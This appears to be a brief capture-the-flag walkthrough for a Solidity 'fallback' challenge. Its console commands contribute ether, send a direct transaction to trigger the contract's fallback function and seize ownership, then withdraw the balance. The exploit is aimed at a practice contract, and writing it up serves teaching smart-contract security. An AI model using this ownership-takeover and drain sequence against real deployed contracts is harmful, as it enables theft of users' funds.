## The Fallback Function

A fallback function is a solidity function that is called when no other function in the smart contract matches the function name called.

## Solution

1. Contribute to the contract
```bash 
    contract.contribute({ value: toWei(".000001", "ether"), from: player }) 
```
2. Send a transaction to trigger fallback function
```bash
    sendTransaction({ to: contract.address, value: toWei(".000001", "ether"), from: player })
```
3. Withdraw from contract 
```bash
    contract.withdraw()
```

**Verify ownership 
```bash
    await contract.owner()
```
